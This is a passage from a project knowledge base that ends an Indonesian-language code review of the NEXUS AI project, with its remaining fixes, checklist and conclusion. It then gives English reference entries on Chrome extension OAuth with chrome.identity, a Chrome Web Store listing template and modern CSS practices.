    "sync-version": "node -e \"const p=require('./package.json'); const pp=require('./NEXUS_PUBLIC_DISTRIBUTION/package.json'); pp.version=p.version; require('fs').writeFileSync('./NEXUS_PUBLIC_DISTRIBUTION/package.json', JSON.stringify(pp,null,2))\""
}
```

---

## 7. SARAN PERBAIKAN PRIORITAS MENENGAH

### M1: Persist `EvolutionPiper` State ke File

Agar hard limit 25 cycles benar-benar tidak bisa di-bypass dengan restart:

```javascript
// Simpan state ke: memory/operational/evolution_state.json
async checkEvolutionBoundary() {
    const stateFile = path.join(this.rootPath, 'memory/operational/evolution_state.json');
    let state = { currentCycle: 0, sessionStart: Date.now() };
    try {
        if (await fs.pathExists(stateFile)) state = await fs.readJson(stateFile);
    } catch (_) {}
    
    if (state.currentCycle >= this.MAX_EVOLUTION_CYCLES) {
        throw new Error(`🚧 BOUNDARY: Max ${this.MAX_EVOLUTION_CYCLES} cycles. Run 'nexus distill' first.`);
    }
    
    state.currentCycle++;
    await fs.writeJson(stateFile, state);
    this.currentCycle = state.currentCycle;
}
```

### M2: Gunakan Logger Queue untuk Concurrent Write Safety

```javascript
async log(category, level, agent, task_id, event, message, duration_ms = 0, metadata = {}, trace_id = 'N/A') {
    // ...validasi...
    this._writeQueue = this._writeQueue.then(async () => {
        try {
            await fs.ensureDir(logDir);
            await fs.appendFile(logFile, JSON.stringify(logEntry) + '\n');
        } catch (e) {
            console.error(`Logger Failed: ${e.message}`);
        }
    });
    return this._writeQueue;
}
```

### M3: Hapus `glob ^8.1.0` — Gunakan `fast-glob` Saja

Kedua library ada sekarang, tapi `glob ^8.1.0` deprecated dan `fast-glob` jauh lebih cepat:

```bash
npm uninstall glob
```

Lalu ganti semua `require('glob')` dengan `require('fast-glob')` di seluruh codebase:
```bash
grep -rn "require('glob')" agent/ tests/ --include="*.js"
```

### M4: Tambahkan npm Cache ke `npm-publish.yml`

```yaml
- uses: actions/setup-node@v4
  with:
    node-version: 20
    cache: 'npm'              # ← Tambahkan ini
    registry-url: https://registry.npmjs.org/
```

### M5: Tambahkan Network Isolation ke `docker-compose.yml`

```yaml
networks:
  nexus-internal:
    driver: bridge

services:
  nexus-ai:
    networks:
      - nexus-internal
  redis:
    networks:
      - nexus-internal
```

### M6: Tambahkan DecisionEngine Score Validation

```javascript
// Di DecisionEngine.resolve()
const ranked = options.map(opt => {
    let totalScore = 0;
    for (const criteria in weights) {
        if (opt.scores?.[criteria] === undefined) {
            console.warn(`⚠️ DecisionEngine: "${opt.id}" missing score for "${criteria}"`);
        }
        totalScore += (opt.scores?.[criteria] || 0) * weights[criteria];
    }
    return { ...opt, final_score: parseFloat(totalScore.toFixed(4)) };
});
```

---

## 8. SARAN PERBAIKAN JANGKA PANJANG

### L1: Migrasi Test ke Jest

Custom runner masih dipakai. Jest akan memberikan:
- Coverage report otomatis
- Watch mode untuk TDD
- Snapshot testing
- Integrasi CI lebih baik

```bash
npm install --save-dev jest
```

Tambah ke `ci.yml`:
```yaml
- name: Run Tests with Coverage
  run: npx jest --coverage
```

### L2: Upgrade `llamaindex` ke Versi Stabil Terbaru

`llamaindex ^0.12.1` perlu diverifikasi kompatibilitasnya dengan Node.js 22:
```bash
npm outdated llamaindex
npm install llamaindex@latest
```

### L3: Implementasi API Rate Limiting di `LocalIntelligence`

Jika Ollama diakses paralel oleh banyak agent sekaligus via `ParallelRunner`, bisa terjadi request flood. Tambahkan rate limiter di `LocalIntelligence`:

```javascript
const pLimit = require('p-limit');
const ollamaLimit = pLimit(2); // Max 2 concurrent Ollama requests

async generate(prompt, tag) {
    return ollamaLimit(() => this._doGenerate(prompt, tag));
}
```

### L4: Tambahkan `NEXUS_PUBLIC_DISTRIBUTION` ke CI

Distribusi publik juga perlu ditest:
```yaml
- name: Test Public Distribution
  run: cd NEXUS_PUBLIC_DISTRIBUTION && npm ci && npm test
```

### L5: Implementasi OpenTelemetry untuk Distributed Tracing

`currentCorrelationId` sudah ada — ini adalah fondasi yang baik. Langkah selanjutnya: integrasikan dengan OpenTelemetry untuk tracing yang bisa divisualisasi di Grafana/Jaeger.

### L6: Buat `package-lock.json` untuk `NEXUS_PUBLIC_DISTRIBUTION`

```bash
cd NEXUS_PUBLIC_DISTRIBUTION
npm install
git add package-lock.json
```

---

## 9. CHECKLIST TINDAKAN YANG BISA LANGSUNG DIKERJAKAN

### ⚡ Hari Ini (< 30 menit total)

- [ ] **Hapus `|| echo`** di `ci.yml` baris 28 — 2 menit
- [ ] **Sinkronkan versi** `NEXUS_PUBLIC_DISTRIBUTION/package.json` dari `3.0.0` → `3.3.0` — 1 menit
- [ ] **Bersihkan `.env`** — ubah `PROJECT_PATH=c:\Users\ACER\Desktop\NEXUS AI` → `PROJECT_PATH=./` — 1 menit
- [ ] **Hapus `glob ^8.1.0`** dari `package.json` karena sudah ada `fast-glob` — 5 menit
- [ ] **Tambah `cache: 'npm'`** di `npm-publish.yml` — 1 menit

### 🔧 Sprint Ini (< 1 hari kerja)

- [ ] **Buat `agent/core/workers/plugin-worker.js`** dan hapus `eval: true` dari SandboxExecutor
- [ ] **Perbaiki path traversal** di `Machinist._validateForgePath()`
- [ ] **Perbaiki `NativeBridge.js`** untuk cross-platform (hapus `.exe` hardcoded)
- [ ] **Implementasi Logger queue** untuk concurrent write safety
- [ ] **Tambahkan network isolation** di `docker-compose.yml`
- [ ] **Tambahkan npm cache** di `npm-publish.yml`

### 📅 Sprint Berikutnya

- [ ] **Persist `EvolutionPiper` state** ke `memory/operational/evolution_state.json`
- [ ] **Tambahkan DecisionEngine score validation**
- [ ] **Buat `package-lock.json`** untuk `NEXUS_PUBLIC_DISTRIBUTION`
- [ ] **Verifikasi `llamaindex ^0.12.1`** kompatibilitas dengan Node.js 22
- [ ] **Migrasi ke Jest** sebagai test framework

---

## 10. KESIMPULAN SINGKAT

**Versi ini adalah lompatan besar.** Hampir semua temuan kritis dari review pertama sudah diselesaikan:

| Area | v3.3.0 (ZIP 1) | v3.3.0 (ZIP 2) |
|---|---|---|
| Shell Injection | 🔴 Ada | ✅ Diperbaiki |
| .env di Git | 🔴 Ada | ✅ Diperbaiki |
| SandboxExecutor | 🔴 Bukan sandbox | ✅ Worker Thread nyata |
| NexusEngine size | 🔴 1317 baris | ✅ 384 baris + phases |
| Logger I/O | 🟠 Read-rewrite | ✅ NDJSON append |
| CI/CD | 🟠 Hanya release | ✅ Push/PR + lint |
| package-lock.json | 🔴 Tidak ada | ✅ Ada |
| Graceful Redis | 🔴 Crash diam-diam | ✅ Graceful degradation |
| Port hardcoded | 🟠 8001 selalu | ✅ Dinamis |
| docker-compose | 🟠 Minimal | ✅ env_file + healthcheck |

**Sisa pekerjaan** adalah refinement dan hardening — bukan perbaikan fundamental. Project ini sudah dalam kondisi yang layak untuk production testing. Tiga hal yang paling penting untuk dikerjakan berikutnya, berurutan:

1. Fix `|| echo` di `ci.yml` — karena ini membuat seluruh CI security theater
2. Fix path traversal di `Machinist` — karena ini adalah celah keamanan nyata
3. Ganti `eval: true` di SandboxExecutor — untuk menutup vektor injection terakhir

---

*Review ini berbasis analisis statis kode. Asumsi: `tests/TDD/runner.js` dan `sandbox-master-runner.js` tidak berubah signifikan dari versi sebelumnya (belum di-extract untuk diverifikasi).*


---
> **METADATA (NEXUS SEMANTIC TAGS)**: [security, ui-ux, performance, tdd, vcs, saas, api]

### 📘 KNOWLEDGE: NEXUS_AUTH-IDENTITY.MD

# Authentication with chrome.identity
> **VERSION**: v1 | **Last Updated**: 26/05/2026



## Setup

```json
{
  "permissions": ["identity"],
  "oauth2": {
    "client_id": "YOUR_CLIENT_ID.apps.googleusercontent.com",
    "scopes": [
      "https://www.googleapis.com/auth/userinfo.profile",
      "https://www.googleapis.com/auth/userinfo.email"
    ]
  }
}
```

## Getting an OAuth Token

```js
async function signIn() {
  return new Promise((resolve, reject) => {
    chrome.identity.getAuthToken({ interactive: true }, (token) => {
      if (chrome.runtime.lastError) {
        reject(new Error(chrome.runtime.lastError.message));
      } else {
        resolve(token);
      }
    });
  });
}
```

Or with the promise-based API (Chrome 116+):
```js
const { token } = await chrome.identity.getAuthToken({ interactive: true });
```

## Fetching User Profile

```js
async function getUserProfile(token) {
  const response = await fetch('https://www.googleapis.com/oauth2/v3/userinfo', {
    headers: { Authorization: `Bearer ${token}` }
  });
  if (!response.ok) throw new Error('Failed to fetch profile');
  return response.json();
  // Returns: { sub, name, given_name, family_name, picture, email, email_verified }
}
```

## Sign Out

```js
async function signOut(token) {
  // Remove cached token
  await chrome.identity.removeCachedAuthToken({ token });

  // Optionally revoke the token server-side
  await fetch(`https://accounts.google.com/o/oauth2/revoke?token=${token}`);
}
```

## Error Handling

```js
try {
  const { token } = await chrome.identity.getAuthToken({ interactive: true });
  const profile = await getUserProfile(token);
  displayProfile(profile);
} catch (err) {
  if (err.message.includes('canceled')) {
    showMessage('Sign-in was cancelled');
  } else if (err.message.includes('not granted')) {
    showMessage('Permission was denied');
  } else {
    showMessage('Sign-in failed: ' + err.message);
  }
}
```

## Setting Up Google Cloud Console

1. Go to console.cloud.google.com
2. Create a project (or select existing)
3. Enable "Google People API" or "Google OAuth2 API"
4. Create OAuth 2.0 credentials → Chrome Extension type
5. Set the Application ID to your extension's ID
6. Copy the client_id to your manifest.json

### Extension ID: Development vs Production

**This is critical and often missed.** The OAuth `client_id` is tied to a specific extension ID.
The extension ID changes depending on how you load the extension:

| Context | How ID is determined |
|---------|---------------------|
| Unpacked (development) | Derived from the extension's directory path — changes if you move the folder |
| Packed (.crx) | Derived from the private key used to pack |
| Chrome Web Store | Assigned by the store, permanent |

**To get a stable ID during development**, add a `"key"` field to your manifest.json.
This ensures the same extension ID regardless of directory path:

1. Pack your extension once (`chrome://extensions` → Pack Extension)
2. Open the generated `.crx` as a ZIP, extract the `key` from its manifest
3. Add that key to your development manifest:

```json
{
  "key": "MIIBIjANBgkqhk...your-public-key-here...",
  "manifest_version": 3,
  "name": "My Extension"
}
```

Alternatively, note your unpacked extension's ID from `chrome://extensions` and configure
the OAuth client for that specific ID. Just be aware it will change if the folder moves.

**Always tell users:** "After publishing to the Chrome Web Store, update your OAuth client
configuration with the store-assigned extension ID."

## Non-Google OAuth (launchWebAuthFlow)

For third-party OAuth providers (GitHub, Twitter, etc.):

```js
const redirectUrl = chrome.identity.getRedirectURL();
// Returns: https://<extension-id>.chromiumapp.org/

const authUrl = `https://github.com/login/oauth/authorize?client_id=XXX&redirect_uri=${redirectUrl}`;

const responseUrl = await chrome.identity.launchWebAuthFlow({
  url: authUrl,
  interactive: true
});

// Parse the token from responseUrl
const url = new URL(responseUrl);
const code = url.searchParams.get('code');
```


---
> **METADATA (NEXUS SEMANTIC TAGS)**: [security, api]

### 📘 KNOWLEDGE: NEXUS_CHROMEWEBSTORE-TEMPLATE.MD

# CHROMEWEBSTORE.md Template
> **VERSION**: v2 | **Last Updated**: 26/05/2026



Copy this template into the project root as `CHROMEWEBSTORE.md` and fill in each section.
Fields marked `[REQUIRED]` must be completed before submission. Fields marked `[RECOMMENDED]`
are optional but improve listing quality and approval odds.

---

```markdown
# Chrome Web Store Listing — [Extension Name]

> Last Updated: YYYY-MM-DD

## Store Listing

**Extension Name** [REQUIRED]
<!-- Must match manifest.json "name". Max 75 characters. -->


**Short Description** [REQUIRED]
<!-- Max 132 characters. Shown in search results and tiles. Be specific about function. -->


**Detailed Description** [REQUIRED]
<!-- Max 16,000 characters. Structure recommendation:
     Line 1: One-sentence summary of what the extension does
     Paragraph 2: Key features (use line breaks, not bullet points — CWS strips markdown)
     Paragraph 3: How to use it (step-by-step)
     Paragraph 4: Privacy/permissions note (builds trust)
     Paragraph 5: Support/feedback info
-->


**Category** [REQUIRED]
<!-- Pick one: Accessibility, Blogging, Developer Tools, Fun, News & Weather,
     Photos, Productivity, Search Tools, Shopping, Social & Communication, Sports -->


**Single Purpose** [REQUIRED]
<!-- One sentence. Narrow and easy to understand.
     Good: "Highlights and saves text selections on web pages"
     Bad:  "Productivity tool that helps you work better" -->


**Primary Language** [REQUIRED]
<!-- e.g., English, German, etc. -->


## Graphics & Assets

| Asset | Dimensions | Status | Filename |
|-------|-----------|--------|----------|
| Store Icon [REQUIRED] | 128×128 PNG | ⬜ Not created | |
| Screenshot 1 [REQUIRED] | 1280×800 or 640×400 | ⬜ Not created | |
| Screenshot 2 [RECOMMENDED] | 1280×800 or 640×400 | ⬜ Not created | |
| Screenshot 3 [RECOMMENDED] | 1280×800 or 640×400 | ⬜ Not created | |
| Screenshot 4 | 1280×800 or 640×400 | ⬜ Not created | |
| Screenshot 5 | 1280×800 or 640×400 | ⬜ Not created | |
| Small Promo Tile [RECOMMENDED] | 440×280 | ⬜ Not created | |
| Marquee Promo Tile | 1400×560 | ⬜ Not created | |

<!-- Status options: ⬜ Not created | 🟡 Needs update | ✅ Ready -->

### Screenshot Notes
<!-- Describe what each screenshot should show. Good screenshots demonstrate the extension
     in action, not just the popup. Include annotations if helpful. -->


## Permissions Justification

<!-- Every permission in manifest.json needs a justification. The review team reads these.
     Be specific about WHY the permission is needed and WHAT user-facing feature uses it.
     "Required for functionality" will be rejected. -->

| Permission | Type | Justification |
|------------|------|---------------|
| | permissions | |
| | host_permissions | |

<!-- Type is either "permissions" or "host_permissions" -->


## Privacy & Data Use

<!-- These map to the CWS data use disclosure form. Be exhaustive and accurate —
     mismatches between what you declare and what the code does cause rejection. -->

### Data Collection

**Does the extension collect user data?** Yes / No

<!-- If Yes, fill in the table below. If No, skip to the certification. -->

| Data Type | Collected? | Transmitted Off-Device? | Purpose | Shared with Third Parties? |
|-----------|-----------|------------------------|---------|---------------------------|
| Personally identifiable info | | | | |
| Health info | | | | |
| Financial info | | | | |
| Authentication info | | | | |
| Personal communications | | | | |
| Location | | | | |
| Web history | | | | |
| User activity | | | | |
| Website content | | | | |

### Data Use Certification
<!-- Check all that apply: -->
- [ ] Data is NOT sold to third parties
- [ ] Data is NOT used for purposes unrelated to the extension's core functionality
- [ ] Data is NOT used for creditworthiness or lending purposes


## Privacy Policy

**Privacy Policy URL** [REQUIRED if collecting data, RECOMMENDED otherwise]


<!-- Host this at a publicly accessible URL. GitHub Pages, your website, or a
     Notion page all work. See references/webstore/[privacy-policy.md](../vcs/NEXUS_PRIVACY-POLICY.MD) for a template. -->


## Distribution

**Visibility**: Public / Unlisted / Private
**Regions**: All regions / [List specific regions]
**Pricing**: Free / Paid

<!-- Note: Paid extensions require a Google Payments merchant account and physical address. -->


## Developer Info

**Publisher Name** [REQUIRED]

**Contact Email** [REQUIRED]
<!-- Displayed publicly on the store listing. -->

**Support URL / Email** [RECOMMENDED]
<!-- Where users go for help. Can be a GitHub Issues page, email, or support site. -->

**Homepage URL** [RECOMMENDED]


## Version History

<!-- Add an entry for every version submitted to the Chrome Web Store.
     Most recent first. -->

| Version | Date | Changes | Status |
|---------|------|---------|--------|
| | | | Draft |

<!-- Status options: Draft | Submitted | In Review | Published | Rejected -->


## Review Notes

<!-- Track rejection reasons, communication with the review team, and fixes applied.
     This section is for your records, not published to the store. -->

### Known Issues / Limitations
<!-- Document anything reviewers might flag or users should know about. -->


### Rejection History
<!-- If applicable:
| Date | Reason | Fix Applied | Resubmitted |
|------|--------|-------------|-------------|
-->

```


---
> **METADATA (NEXUS SEMANTIC TAGS)**: [security, ui-ux]

### 📘 KNOWLEDGE: NEXUS_CSS.MD

# CSS: Modern Architecture and Performance
> **VERSION**: v1 | **Last Updated**: 26/05/2026



These guidelines provide a high-density reference for writing maintainable, performant, and standard-compliant CSS.

1. [1. Foundations](#1-foundations)
2. [2. Inheritance and The Cascade](#2-inheritance-and-the-cascade)
3. [3. Selectors and scoping](#3-selectors-and-scoping)
   1. [Prefer CSS selectors over JS for complex element targeting](#prefer-css-selectors-over-js-for-complex-element-targeting)
   2. [Use `:is()` (or `:where()`) instead of CSS rule duplication for fallbacks](#use-is-or-where-instead-of-css-rule-duplication-for-fallbacks)
   3. [Avoid overmatching](#avoid-overmatching)
   4. [Nesting and scoping](#nesting-and-scoping)
4. [4. Interactivity](#4-interactivity)
   1. [Focus management](#focus-management)
   2. [Touch targets](#touch-targets)
5. [5. Design Tokens and Theming](#5-design-tokens-and-theming)
   1. [Dark mode](#dark-mode)
   2. [Forced Colors Mode](#forced-colors-mode)
   3. [Generating tints](#generating-tints)
   4. [Theming browser-generated UI](#theming-browser-generated-ui)
6. [6. Responsive design](#6-responsive-design)
   1. [Responsive Typography](#responsive-typography)
7. [7. Typography](#7-typography)
   1. [Text wrapping](#text-wrapping)
8. [8. Visual effects](#8-visual-effects)
   1. [Depth and texture](#depth-and-texture)
   2. [Shapes](#shapes)
   3. [Gradients and `color-mix()`](#gradients-and-color-mix)
   4. [Patterns](#patterns)
9. [9. Transitions \& animations](#9-transitions--animations)
   1. [Performance](#performance)
   2. [Accessibility](#accessibility)
10. [10. Generated content](#10-generated-content)


## 1. Foundations

Be allergic to knowledge duplication. Prefer variables over repetition, but whenever possible, prefer built-in conventions such as:
- `currentColor` instead of defining a variable and setting `color` to it
- The `inherit` keyword instead of defining a variable on the parent and using it on the same property across parent and child.
- `em` units instead of `font-size: var(--size)`
- `cqw`/`cqh` (or their logical versions — `cqi`/`cqb`) units instead of repeating box model values.
- Code duplication is not knowledge duplication. The goal is robustness and maintainability, not saving characters.
- Prefer **logical properties and values** over physical ones (e.g. `margin-inline-start` instead of `margin-left`) so that styles adapt to different writing modes and orientations. Even if the page author does not plan to localize, external translation tools often display translated text in context.
- Do not use logical properties indiscriminately — ask yourself "would I want this to flip in RTL?" — if the answer is no, use the physical property instead.
- Consider different viewing modes (dark mode, high contrast mode), different viewport sizes, and different input modes (touch, keyboard, pointer).

## 2. Inheritance and The Cascade

**Avoid** introducing BEM naming conventions to manage specificity.
Instead, use modern CSS features such as cascade layers and `:where()` to make cascade behavior predictable and follow author intent.

Use cascade layers (`@layer`) to define explicit priority zones (e.g., `reset`, `base`, `theme`, `components`, `utilities`), and declare their order upfront (e.g. `@layer reset, base, theme, components, utilities;`).
Within each layer, use `:where()` to make selectors only compete based on meaningful signals, not incidental filters (`:not()` edge cases, remote ancestors, etc.) or for one-off easily overridable defaults.

Use keywords like `inherit`, `initial`, `unset`, or `revert` instead of explicit values to improve maintainability and better express intent.
Examples:
- When specifying a transition on a child that should match the parent's `transition-*` properties, instead of repeating the transition properties on the child, use `transition: inherit` (reduce duplication, improve maintainability)
- Use `initial` to reset a property to its initial value instead of specifying the value explicitly (clearer expression of intent)

## 3. Selectors and scoping

Modern browser-native selectors reduce the need for preprocessors and complex state-tracking in JS.

### Prefer CSS selectors over JS for complex element targeting

- **DO** use `:has()` to style parents based on child state instead of managing classes in JS (e.g. `label:has(:checked)` instead of a manual `label.has-checked` class) For more information, see the guides at `child-state-based-styling` (via `npx -y modern-web-guidance@latest retrieve "child-state-based-styling"`) and `content-based-styling` (via `npx -y modern-web-guidance@latest retrieve "content-based-styling"`).
- **DO NOT** nest `:has()` or use pseudo-elements inside it (browser API limitation)
- Use `:nth-child(<An+B> of <selector>)` when you need to style every n-th element of a certain type. E.g. `details:nth-child(1 of [open])` will style the first open `<details>` element it finds, whereas `details[open]:first-child` would style only the first child if and only if it was open.

### Use `:is()` (or `:where()`) instead of CSS rule duplication for fallbacks

**DO NOT** duplicate CSS rules to provide fallbacks for pseudo-classes that may not be supported — use `:is()` or `:where()` instead and take advantage of their forgiving parsing rules.

```css
/* BAD: duplicate rules instead of using `:where()` */
[popover]:popover-open {
  /* styles for native popovers */
}
[popover].\:popover-open {
  /* same styles again, for polyfilled popovers */
}

/* GOOD */
[popover]:where(:popover-open, .\:popover-open) {
  /* same styles in one rule */
}
```

Do NOT use this for pseudo-elements, as they are not supported in `:is()` or `:where()`.

### Avoid overmatching

Write selectors in a way that expresses _intent_.

#### Use `:not()` instead of overrides to exclude irrelevant states/targets

When the intent is to exclude certain states or elements that are fundamentally irrelevant, use `:not()`.

For example, to apply bottom borders between list items, don't do this:

```css
.fancy-list li {
  border-bottom: 1px solid silver;
}

.fancy-list li:last-child {
  border-bottom: none;
}
```

This can unintentionally overwrite a desirable `border-bottom` set from another rule.
The actual intent was to only apply the bottom border to the non-last `li`s. The code above is a workaround that poorly expresses this intent. Instead, this expresses intent more clearly:

```css
.fancy-list li:not(:last-child) {
  border-bottom: 1px solid silver;
}
```

Similarly, don't do this:

```css
button:hover {
  background: var(--color-blue);
}

button:disabled {
  background: var(--color-neutral);
}
```

If we reorder the two rules, we will get a hover background on disabled buttons!
Instead, do this:

```css
button:hover:not(:disabled) {
  background: var(--color-blue);
}

button:disabled {
  background: var(--color-neutral);
}
```

This works regardless of reordering, as the first rule does not overmatch.

#### Prefer `@scope` over `:not()` for excluding (potentially deeply nested) subtrees

While `:not()` + descendant selectors can exclude subtrees, this works poorly for deeply nested structures.
For example, `.card :not(.content *)` will not work as expected for nested cards.
`@scope` fixes this as it takes hierarchical proximity into account:

```css
@scope (.card) to (.content) {
  /* styles for elements inside .card but not inside .content */
}
```

This will work as expected even for nested cards.

#### Overrides are fine for specialization

This is fine:

```css
button {
  background: var(--color-neutral);
}

button.primary {
  background: var(--color-blue);
}
```

Both rules express legitimate _intent_: buttons are generally neutral, but primary ones are blue.

#### No global resets

**DO NOT** use global resets (styles on `*`) as they cannot be overridden by web components or lower-priority cascade layers (without `!important`). Instead, apply reset styles to specific element types and/or conditions.

### Nesting and scoping

Use native CSS nesting to group related styles to the extent it improves maintainability and readability.

Prefer `@scope` over nesting when proximity should matter more than pure specificity. This is common in selectors that can be nested in any order, but the closest matching one (in element -> ancestor order) should win, e.g. theming classes.

For example this will not work as expected:
```css
.dark .invert { color-scheme: light }
.light .invert { color-scheme: dark }
```

If `.invert` is nested within _both_ `.dark` and `.light`, it will always resolve to dark mode as both rules have the same specificity.
Using `@scope` fixes this:

```css
@scope (.dark) {
  .invert { color-scheme: light }
}

@scope (.light) {
  .invert { color-scheme: dark }
}
```

## 4. Interactivity

### Focus management

- Use `:focus-visible` to define custom focus rings, not `:focus`.
- Do not remove the browser's default focus rings (via `outline: none`) without providing an alternative visible focus style.
- Prefer `outline` over other properties (e.g. `box-shadow`) for focus rings. If you must rely on `box-shadow` for focus rings, provide an `outline`-based fallback for High Contrast Mode using the `forced-colors` media query.
- Pair focus outlines with `outline-offset` to visually separate the ring from the element.

### Touch targets

- Interactive elements should be at least 24×24 CSS pixels (WCAG 2.5.8 AA). Enforce with `min-block-size` / `min-inline-size` or padding rather than `width` / `height`, so content can grow the target but not shrink it.
- Bump targets up on coarse pointers: `@media (pointer: coarse) { ... }`.
- **DON'T** use `touch-action: none` for custom gestures — it disables page scrolling through the element. Scope to the axis you actually need: `pan-y` for horizontal swipes (page still scrolls vertically), `pan-x` for vertical ones. Reserve `none` for elements where no native touch behavior makes sense (e.g. a drawing canvas).

## 5. Design Tokens and Theming

Use CSS custom properties on `:root` to define core design variables (colors, fonts, sizes, etc) used throughout the design, for visual consistency and to scale UI design across teams.
**DO NOT** specify nontrivial styling values inline. E.g. `background: transparent` or `padding: 0` is ok, but `background: #f06` or `padding: .3em` are not.
One exception is use cases where keeping code small and simple is far more important than long-term maintainability and evolution, such as testcases.

Typically these are organized in tiers, with each tier building upon the previous one. For example:
1. Tier 1: Literal design tokens (e.g. `--color-blue-10`, `--color-gray-90`, `--font-sans-serif`, `--size-xl` etc)
2. Tier 2: Semantic design tokens (e.g. `--color-accent`, `--color-neutral`, `--font-body`, `--font-heading` etc)
3. Tier 3: General UI design tokens (e.g. `--ui-border`, `--surface-bg-subtle` etc)
4. Tier 4: Component-specific design tokens (e.g. `--button-bg-primary-hover`, `--button-border-color-secondary` etc)

The smaller the scope of the use case, the fewer tiers it needs. E.g. a quick demo or toy app are fine with one tier. Do not overengineer.
Check for any existing conventions around naming and levels before inventing your own.

### Dark mode

- Use `color-scheme: light dark` on `:root` to enable dark mode support that automatically adapts to the system setting. You can also specify `color-scheme` on individual elements to force a different value for that subtree (`light`/`dark` or `light dark` for the system default)
- Use `light-dark()` to provide alternatives that automatically resolve based on the element's `color-scheme`.
Typically this happens in Tier 2 or Tier 3 tokens.
- IMPORTANT: When using `light-dark()` on an inherited `<color>` property, it will resolve to a specific color based on that element's `color-scheme` and inherit as that resolved color, not as a `light-dark()` value. It will NOT adapt to any descendant-specific `color-scheme` overrides. To keep `light-dark()` color tokens dynamic resolve them as late as possible by only passing them around as unregistered custom properties and avoid relying on inherited color values across `color-scheme` boundaries.

See `dark-mode` (via `npx -y modern-web-guidance@latest retrieve "dark-mode"`) for tips & best practices on supporting dark mode switching and `component-specific-light-dark-theme` (via `npx -y modern-web-guidance@latest retrieve "component-specific-light-dark-theme"`) for more on applying different `color-scheme` modes than the page-wide setting on certain elements.

### Forced Colors Mode

In Forced Colors Mode (High Contrast on Windows), the browser overrides author colors with system keywords and strips `background-image`, `box-shadow`, and `border-image`.

- Define system color fallbacks for color tokens using `@media (forced-colors: active)`.
- **DON'T** rely on `background-image`, `box-shadow`, or `border-image` to convey borders, separators, or state — they disappear in forced colors (and often in print too). If you must, ensure there's an alternative in forced colors mode, such as `outline` or `border` with system color keywords (`CanvasText`, `LinkText`, `ButtonText`, `Highlight`, `GrayText`, etc.).
- Use `forced-color-adjust: none` where color is essential information (syntax highlighter, color picker swatch). **DON'T** use `forced-color-adjust: none` just to preserve aesthetics.


### Generating tints

Before generating tints dynamically, check if you can use an existing, predefined, design token. This allows much more designer control and ensures consistency.

If you need to generate lighter or darker colors dynamically:
- **DO NOT** just adjust the lightness channel in `oklch`/`oklab` or `lch`/`lab`, e.g. `oklab(from var(--primary) 0.9 a b)`. While that is theoretically the correct way, browsers do not yet implement gamut mapping, so the resulting color is unpredictable.
- You can use `color-mix()` to mix with white or black (preferably in `oklab`). This keeps the color safely in gamut, but tends to over-desaturate colors and produce washed out tints and shades.
- You MAY combine lightness adjustment with any of the other methods (e.g. `color-mix(in oklab, oklch(from var(--primary) 0.9 c h), white 30%)`) for a balance between the two, but avoid going above 30% for the lightness adjustment.

### Theming browser-generated UI

Most browser-generated UI can be customized to some extent using CSS.
Even if it requires modern features, it degrades gracefully in older browsers, and thus often does not require a polyfill or fallback.

Before re-creating browser UI (form controls, scrollbars, selections, error messages, etc), first verify that:
1. the browser UI cannot be customized enough for your needs, even with modern CSS,
2. the desired customization is sufficiently critical to justify the tradeoffs of re-creating built-in UI — most notably losing accessible semantics, keyboard handling, IME, and AT integration that the native UI provides for free.

Example customizations that are possible:
- Use `::selection` to customize highlighted text colors.
- **DON'T** apply `user-select: none` to content text — breaks copy-paste, translation tools, and AT "read from here" gestures. Limit it to chrome (drag handles, toolbars, redundant button labels).
- Use `accent-color` to apply the page's accent color to any browser-generated UI.
- Use `color-scheme` to have browser UI adapt to light/dark mode.
- Use `scrollbar-color` to customize scrollbar colors and `scrollbar-width` to control scrollbar thickness — keep the thumb visibly distinct from the track (≥3:1), and don't set `scrollbar-width: none` on scrollable regions (use it only when scrolling is fully replaced by another affordance).
- Use `:user-invalid` / `:user-valid` for validity styling, **not** `:invalid` / `:valid` — they only match after the user has interacted with the field, avoiding the hostile default of flagging required-empty fields as errors on page load.
- Buttons and text fields (including `<textarea>`) can generally be styled as normal elements.
- Use `font-size` to scale and other textual properties to control typography

#### Styling textual fields (`<input>` & `<textarea>`)

For most styling purposes (e.g. colors, borders, backgrounds, typography, etc) treat these elements as normal text containers.

- Use `:placeholder-shown` and `::placeholder` to style input placeholders.
- Use `field-sizing: content` to make text fields size to content.
- For `<textarea>` elements, use `resize: vertical` to disable horizontal resizing or `resize: none` to disable all resizing.

#### Multiple choice controls (select, radios, checkboxes)

- To select one among many options presented in a dropdown: Use a `<select>` + `appearance: base-select` + `::picker(select)`. For more info see `branded-select-styling` (via `npx -y modern-web-guidance@latest retrieve "branded-select-styling"`)
- Selecting one or more among multiple options laid out inline in the page: Use a `<input type=checkbox>` or `<input type=radio>` inside a `<label>` for each option. Style via `label:has(:checked)`.
- Style checkboxes, radios and switches via `appearance: none` + generated content (`::before`/`::after`) or background images to draw the checked state.
<!-- Customizable select listbox version currently buggy + this has much better browser support -->

#### Non-textual `<input>`s (buttons, sliders, file inputs etc.)

- File inputs: Use `::file-selector-button` to style the button.
- Do not use `<input>` with a `type` of `button`, `submit` or `reset`. Use `<button>` instead and style it as a regular element.
- Sliders: Use `appearance: none` + thumb pseudo-elements (`::-webkit-slider-thumb`, `::-moz-range-thumb`, etc) and track pseudo-elements (`::-webkit-slider-runnable-track`, `::-moz-range-track`, etc) for more granular control.

## 6. Responsive design

- Use `@container` queries to create component-driven responsive layouts that adapt to their parent container's size rather than the viewport.
- Use dynamic viewport units (`dvh`, `dvw`) instead of `vh`/`vw` to prevent layout breakage when mobile browser UI elements (like address bars) appear or disappear.
- Use `aspect-ratio` for media elements (like `<img>` and `<video>`) to reserve space during loading and prevent Cumulative Layout Shift (CLS).

### Responsive Typography

- **DO** combine viewport-relative and font-relative units in `clamp()` for font sizes that scale with the viewport size while ensuring they stay within a desired range. For example, `clamp(2rem, 1rem + 5vw, 4rem)`. Adjust the proportion of viewport-relative and font-relative units to control how quickly the font-size changes.
- **DON'T** use `vw` alone for font-size without `clamp()`, as it can scale text too small or too large on extreme screens.

## 7. Typography

- Use unitless numbers for `line-height` (e.g., `1.5`) to ensure relative scaling during font-size inheritance.
- Use `overflow-wrap: break-word` (or `anywhere`) to contain long URLs.
- **DON'T** use `px` for font-size. Prefer `rem` to honor the user's browser font-size preferences (root font size), or `em` for contextual sizing.

### Text wrapping

- Use `text-wrap: balance` for balanced headlines and headline-like content (e.g. `<th>`)
- Use `text-wrap: pretty` for long-form body text (paragraphs, blockquotes, etc.)
